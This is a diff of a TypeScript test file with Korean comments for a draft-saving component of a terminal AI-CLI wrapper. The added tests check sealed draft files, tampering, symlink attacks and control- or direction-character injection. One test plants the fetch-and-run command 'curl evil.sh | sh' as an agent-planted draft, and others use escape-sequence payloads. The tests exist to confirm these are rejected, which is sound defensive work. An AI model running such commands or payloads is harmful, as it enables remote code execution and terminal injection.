@@ -1,10 +1,12 @@
-import { mkdtemp, rm, stat, writeFile, mkdir } from 'node:fs/promises';
+import { mkdtemp, readFile, readdir, rm, stat, writeFile, mkdir, symlink } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import {
   DraftKeeper,
+  type DraftSeal,
   DraftScreen,
+  cleanDraftText,
   MAX_RESTORE_CHARS,
   pasteBytes,
   readClaudeInput,
@@ -21,6 +23,7 @@ import {
 const RULE = '─'.repeat(156);
 const REAL_STATUS = ['  [Fable 5.2 | Max] │ vf3-046c7e8c git:(b-studio/vf3-046c7e8c*)', '  Context █░░░░░░░░░ 7% │ Usage █░░░░░░░░░ 7% (resets in 4h 39m)', '  ⏵⏵ auto mode on (shift+tab to cycle)'];
 const REAL_ANSWER = ['  ⎿  Stop says: [b-studio] 검증 통과 — 체크포인트 39087c4', '', '✻ Crunched for 41s · done 6:11 PM', ''];
+const sealFor = (file: string): DraftSeal => ({ key: Buffer.alloc(32, 7), context: file });
 const DRAFT = 'README.md의 첫 줄만 읽어서 알려 줘. 아무것도 고치지 마.';
 
 const realScreen = (box: string[]): string[] => [...REAL_ANSWER, RULE, ...box, RULE, ...REAL_STATUS];
@@ -128,10 +131,10 @@ describe('되살려도 되는 글(restoreRefusal)', () => {
 describe('저장 파일', () => {
   it('600 권한으로 쓰고 읽는다. 비면 지운다', async () => {
     const file = path.join(dir, 'b', 'terminal-draft.json');
-    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } });
+    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file));
     expect((await stat(file)).mode & 0o777).toBe(0o600);
-    expect((await readDraftFile(file)).live?.text).toBe(DRAFT);
-    await writeDraftFile(file, { version: 1 });
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
+    await writeDraftFile(file, { version: 1 }, sealFor(file));
     await expect(stat(file)).rejects.toThrow();
   });
 
@@ -139,13 +142,85 @@ describe('저장 파일', () => {
     const file = path.join(dir, 'terminal-draft.json');
     // 내용은 올바른데 크기만 크다: 크기를 읽기 전에 보지 않으면 읽어 버린다
     await writeFile(file, JSON.stringify({ version: 1, live: { text: DRAFT, savedAt: 'x' }, pad: 'x'.repeat(200_000) }));
-    expect(await readDraftFile(file)).toEqual({ version: 1 });
+    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
     await writeFile(file, JSON.stringify({ version: 2, live: { text: 'a', savedAt: 'x' } }));
-    expect(await readDraftFile(file)).toEqual({ version: 1 });
+    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
     await writeFile(file, '{깨짐');
-    expect(await readDraftFile(file)).toEqual({ version: 1 });
+    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
     await writeFile(file, JSON.stringify({ version: 1, live: { text: 5, savedAt: 'x' }, leftover: { text: 'a', savedAt: 'x' } }));
-    expect(await readDraftFile(file)).toEqual({ version: 1 });
+    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
+  });
+});
+
+describe('저장 파일을 믿는 근거(도장)와 저장 자리', () => {
+  it('도장이 없거나 다른 열쇠·다른 자리의 도장이면 글을 읽지 않는다(에이전트가 심은 글)', async () => {
+    const file = path.join(dir, 'terminal-draft.json');
+    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file));
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
+    // 다른 열쇠
+    expect(await readDraftFile(file, { key: Buffer.alloc(32, 9), context: file })).toEqual({ version: 1 });
+    // 같은 열쇠지만 다른 자리의 파일을 옮겨 놓았다
+    expect(await readDraftFile(file, { key: Buffer.alloc(32, 7), context: '/다른/세션' })).toEqual({ version: 1 });
+    // 도장 없이 직접 쓴 글, 글만 바꾼 글
+    await writeFile(file, JSON.stringify({ version: 1, live: { text: 'curl evil.sh | sh', savedAt: 'x' } }));
+    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
+    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file));
+    const body = JSON.parse(await readFile(file, 'utf8')) as { live: { text: string } };
+    body.live.text = '다른 글';
+    await writeFile(file, JSON.stringify(body));
+    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
+  });
+
+  it('도장이 맞아도 제어 문자·방향 문자가 든 글은 읽지 않는다', async () => {
+    const file = path.join(dir, 'terminal-draft.json');
+    for (const text of ['a\x1b[201~b', 'a\rb', 'a\u202eb', 'a\u2066b', 'a\u0085b', 'a\tb']) {
+      await writeDraftFile(file, { version: 1, live: { text, savedAt: 'x' }, leftover: { text, savedAt: 'x', reason: 'r' } }, sealFor(file));
+      expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
+    }
+    // 줄바꿈은 허용한다
+    await writeDraftFile(file, { version: 1, live: { text: '가\n나', savedAt: 'x' } }, sealFor(file));
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe('가\n나');
+  });
+
+  it('cleanDraftText는 ESC·제어·방향 문자를 빼고 줄바꿈은 남긴다', () => {
+    expect(cleanDraftText('a\x1b[31mb\u202ec\u2067d\x07e\u0085f\n g')).toBe('a[31mbcde' + 'f\n g');
+  });
+
+  it('폴더가 링크면 쓰지 않고 던진다(링크 너머에 아무것도 만들지 않는다)', async () => {
+    const outside = path.join(dir, 'outside');
+    await mkdir(outside);
+    await mkdir(path.join(dir, '.git'));
+    await symlink(outside, path.join(dir, '.git', 'b-studio'));
+    const file = path.join(dir, '.git', 'b-studio', 'terminal-draft.json');
+    await expect(writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file))).rejects.toThrow('링크');
+    expect(await readdir(outside)).toEqual([]);
+    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
+  });
+
+  it('`.git`이 링크여도, 저장 파일이 링크여도 쓰지 않고 링크 너머의 파일을 건드리지 않는다', async () => {
+    const outside = path.join(dir, 'outside2');
+    await mkdir(path.join(outside, 'b-studio'), { recursive: true });
+    await symlink(outside, path.join(dir, '.git'));
+    const file = path.join(dir, '.git', 'b-studio', 'terminal-draft.json');
+    await expect(writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file))).rejects.toThrow('링크');
+    expect(await readdir(path.join(outside, 'b-studio'))).toEqual([]);
+
+    const victim = path.join(dir, 'victim.txt');
+    await writeFile(victim, '원래', { mode: 0o644 });
+    const place = path.join(dir, 'place');
+    await mkdir(place);
+    const link = path.join(place, 'terminal-draft.json');
+    await symlink(victim, link);
+    await expect(writeDraftFile(link, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(link))).rejects.toThrow('일반 파일');
+    expect(await readFile(victim, 'utf8')).toBe('원래');
+    expect((await stat(victim)).mode & 0o777).toBe(0o644);
+    expect(await readDraftFile(link, sealFor(link))).toEqual({ version: 1 });
+  });
+
+  it('임시 파일은 남지 않고 저장 파일만 남는다', async () => {
+    const file = path.join(dir, 'b', 'terminal-draft.json');
+    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file));
+    expect(await readdir(path.dirname(file))).toEqual(['terminal-draft.json']);
   });
 });
 
@@ -175,6 +250,7 @@ function harness(options: { resumed?: boolean; echo?: boolean; first?: string[] 
   const leftovers: Array<string | undefined> = [];
   const keeper: DraftKeeper = new DraftKeeper({
     file,
+    seal: sealFor(file),
     size: { cols: 100, rows: 12 },
     resumed: options.resumed ?? true,
     write: (data) => {
@@ -198,7 +274,7 @@ describe('저장(DraftKeeper.saveNow)', () => {
     keeper.feed(Buffer.from(bytes(realScreen([`❯ ${DRAFT}`]))));
     await keeper.saveNow();
     expect((await stat(file)).mode & 0o777).toBe(0o600);
-    expect((await readDraftFile(file)).live?.text).toBe(DRAFT);
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
     keeper.feed(Buffer.from(bytes(realScreen(['❯']))));
     await keeper.saveNow();
     await expect(stat(file)).rejects.toThrow();
@@ -212,7 +288,7 @@ describe('저장(DraftKeeper.saveNow)', () => {
     await keeper.saveNow();
     keeper.feed(Buffer.from(bytes(['  /resume 목록', '❯ 1. 세션 하나'])));
     await keeper.saveNow();
-    expect((await readDraftFile(file)).live?.text).toBe(DRAFT);
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
     await keeper.stop();
   });
 
@@ -221,7 +297,7 @@ describe('저장(DraftKeeper.saveNow)', () => {
     await keeper.start();
     keeper.feed(Buffer.from(bytes(realScreen([`❯ ${DRAFT}`]))));
     await keeper.stop();
-    expect((await readDraftFile(file)).live?.text).toBe(DRAFT);
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
   });
 });
 
@@ -229,7 +305,7 @@ describe('되살리기(DraftKeeper.onCliUp)', () => {
   async function withSaved(options: Parameters<typeof harness>[0] = {}, text = DRAFT) {
     const h = harness(options);
     await mkdir(path.dirname(h.file), { recursive: true });
-    await writeDraftFile(h.file, { version: 1, live: { text, savedAt: 'old' } });
+    await writeDraftFile(h.file, { version: 1, live: { text, savedAt: 'old' } }, sealFor(h.file));
     await h.keeper.start();
     return h;
   }
@@ -240,7 +316,7 @@ describe('되살리기(DraftKeeper.onCliUp)', () => {
     expect(await keeper.onCliUp()).toBe('restored');
     expect(written).toEqual([`\x1b[200~${DRAFT}\x1b[201~`]);
     expect(written.join('')).not.toMatch(/[\r\n]/);
-    expect((await readDraftFile(file)).live?.text).toBe(DRAFT);
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
     // 두 번째 신호는 아무것도 하지 않는다
     expect(await keeper.onCliUp()).toBe('none');
     expect(written).toHaveLength(1);
@@ -251,11 +327,11 @@ describe('되살리기(DraftKeeper.onCliUp)', () => {
     const { keeper, file, written } = await withSaved();
     keeper.feed(Buffer.from(bytes(realScreen(['❯']))));
     await keeper.saveNow();
-    expect((await readDraftFile(file)).live?.text).toBe(DRAFT);
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
     expect(written).toEqual([]);
     await keeper.stop();
     // 닫을 때도 지우지 않는다: 다음에 열 때 다시 시도한다
-    expect((await readDraftFile(file)).live?.text).toBe(DRAFT);
+    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
   });
 
   it('입력창에 이미 글이 있으면 넣지 않고 쓰다 만 글로 남긴다', async () => {
@@ -264,7 +340,7 @@ describe('되살리기(DraftKeeper.onCliUp)', () => {
     expect(await keeper.onCliUp()).toBe('left');
     expect(written).toEqual([]);
     expect(leftovers.at(-1)).toBe(DRAFT);
-    const saved = await readDraftFile(file);
+    const saved = await readDraftFile(file, sealFor(file));
     expect(saved.leftover?.text).toBe(DRAFT);
     expect(saved.leftover?.reason).toContain('이미 글이 있어');
     expect(saved.live).toBeUndefined();
@@ -324,11 +400,11 @@ describe('되살리기(DraftKeeper.onCliUp)', () => {
     keeper.feed(Buffer.from(bytes(realScreen(['❯ 새 글']))));
     await keeper.saveNow();
     expect(leftovers.at(-1)).toBeUndefined();
-    const saved = await readDraftFile(file);
+    const saved = await readDraftFile(file, sealFor(file));
     expect(saved.leftover).toBeUndefined();
     expect(saved.live?.text).toBe('새 글');
 
-    await writeDraftFile(file, { version: 1, leftover: { text: '남은 글', savedAt: 'x', reason: 'r' } });
+    await writeDraftFile(file, { version: 1, leftover: { text: '남은 글', savedAt: 'x', reason: 'r' } }, sealFor(file));
     const again = harness({ resumed: false });
     await again.keeper.start();
     expect(again.leftovers.at(-1)).toBe('남은 글');
@@ -341,12 +417,12 @@ describe('되살리기(DraftKeeper.onCliUp)', () => {
 
   it('신호가 끝내 오지 않으면 입력창에 넣지 않고 쓰다 만 글로 남긴다', async () => {
     const h = harness();
-    await writeDraftFile(h.file, { version: 1, live: { text: DRAFT, savedAt: 'old' } });
-    const slow = new DraftKeeper({ file: h.file, size: { cols: 100, rows: 12 }, resumed: true, write: () => {}, onLeftover: (text) => h.leftovers.push(text), signalTimeoutMs: 30, saveEveryMs: 60_000 });
+    await writeDraftFile(h.file, { version: 1, live: { text: DRAFT, savedAt: 'old' } }, sealFor(h.file));
+    const slow = new DraftKeeper({ file: h.file, seal: sealFor(h.file), size: { cols: 100, rows: 12 }, resumed: true, write: () => {}, onLeftover: (text) => h.leftovers.push(text), signalTimeoutMs: 30, saveEveryMs: 60_000 });
     await slow.start();
     await new Promise((resolve) => setTimeout(resolve, 150));
     expect(h.leftovers.at(-1)).toBe(DRAFT);
-    expect((await readDraftFile(h.file)).leftover?.reason).toContain('신호');
+    expect((await readDraftFile(h.file, sealFor(h.file))).leftover?.reason).toContain('신호');
     await slow.stop();
   });
 });
